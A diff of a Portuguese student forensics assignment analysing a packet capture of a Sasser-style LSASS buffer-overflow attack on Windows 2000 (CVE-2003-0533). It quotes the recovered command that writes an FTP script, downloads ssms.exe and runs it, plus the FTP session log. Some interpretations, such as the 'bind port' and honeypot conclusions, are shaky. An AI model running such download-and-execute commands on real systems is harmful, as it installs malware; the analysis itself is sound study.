@@ -28,9 +28,9 @@ tcpdump -r attack-trace.pcap -n | awk '{print $3}' | sort | cut -d. -f1,2,3 | un
 
  para filtrar os endereços IP e hosts envolvidos no ataque. O resultado desse comando é:
 
-`192.150.11 - pool-98-114-205-102.phlapa.fios`
+`192.150.11.111 - Adobe Systems Inc`
 
-`98.114.205 - wrasse.adobe.com`
+`98.114.205.102 - pool-98-114-205-102.phlapa.fios`
 
 ***
 
@@ -86,4 +86,81 @@ Em um dos pacotes, é possível encontrar o seguinte texto:
 
 Indicando que o SO alvo do ataque é o Windows 2000 na versão 5.0.
 
+O serviço atacado foi o Active Directory, que é um serviço de diretório da Microsoft, que armazena informações sobre objetos em uma rede e disponibiliza essas informações a usuários e administradores dessa rede.
+
+Podemos ver que o serviço atacado é o AD ( Active Directory ) pois, se analisarmos o frame de N° 33, podemos ver um padding de `\x31` que é o número 1 em hexadecimal.
+
+A vulnerabilidade explorada foi um buffer overflow no serviço de AD. Podemos perceber isso pois, se filtrarmos os pacotes por `length` no wireshark e olharmos apenas para o primeiro tcp stream (`tcp.stream eq 1`) veremos que os os maiores pacotes contém diversos `NOPS` e, prováveis, paddings de `\x31`
+
 ***
+
+## 6. Esboce graficamente uma visão geral das ações realizadas pelo atacante (considere a topologia de rede, os passos do ataque, os resultados). (3pts)
+
+***
+
+## 7. Que vulnerabilidade específica foi explorada (CVE, propriedades de segurança violadas, como ela ocorre, etc.)? (1pt)
+
+Ao procurar por `windows 2000 Active Directory buffer overflow` no google, encontramos facilmente o `CVE-2003-0533` que é justamente uma vulnerabilidade de buffer overflow no serviço de AD do Windows 2000.
+A principal propriedade de segurança violada foi a integridade, pois o atacante conseguiu executar um código arbitrário no sistema alvo.
+A exploração ocorre mais especificamente no `lsass.exe`. Ele é responsável por fornecer pesquisas, autenticação e replicação de banco de dados do Active Directory.
+
+Essa vulnerabilidade foi utilizada pelo worm `Sasser` na época.
+
+***
+
+## 8. O que a shellcode faz? Liste a shellcode (código). (4pts)
+
+Ao analisar os frames do arquivo `.pcap` é possível encontrar, no frame `44` uma string contendo 'ms.exe'. Se seguirmos o stream tcp desse frame, podemos encontrar a shellcode que foi utilizada no ataque.
+
+```bash
+echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
+ssms.exe
+```
+
+Ao que parece, essa shellcode faz o bind da porta `8884` em todas as interfaces de rede, faz o download do arquivo `ssms.exe` e o executa.
+
+***
+
+## 9. Você acha que um honeypot foi utilizado para se passar por vítima vulnerável? Justifique. (3pts)
+
+Acredito que sim! Se seguirmos os tcp stream 3, conseguimos ver, ao fim, dos comandos `FTP` uma mensagem:
+
+```text
+220 NzmxFtpd 0wns j0
+USER 1
+331 Password required
+PASS 1
+230 User logged in.
+SYST
+215 NzmxFtpd
+TYPE I
+200 Type set to I.
+PORT 192,150,11,111,4,56
+200 PORT command successful.
+RETR ssms.exe
+150 Opening BINARY mode data connection
+QUIT
+226 Transfer complete.
+221 Goodbye happy r00ting.
+```
+
+Devido à essa mensagem final `Goodbye happy r00ting` acredito que sim, um honeypot foi utilizado para se passar por vítima vulnerável.
+
+***
+
+## 10. Houve código malicioso envolvido? Se sim, qual o nome/rótulo do malware? (1pt)
+
+O código malicioso envolvido foi aquele utilizado no Shellcode, um bind shell para executar comandos via `FTP` e fazer o download de um arquivo.
+
+***
+
+## 11. Você acha que o ataque foi manual ou lançado de maneira automática? Justifique sua resposta. (1pt)
+
+Acredito que o ataque foi lançado de maneira automática, visto que o worm `Sasser` utilizava essa vulnerabilidade para se espalhar pela rede.
+
+***
+
+## Autores
+
+- Vinícius Fontoura de Abreu (GRR20206873)
+- Guiusepe Oneda Dal Pai (GRR20210572)
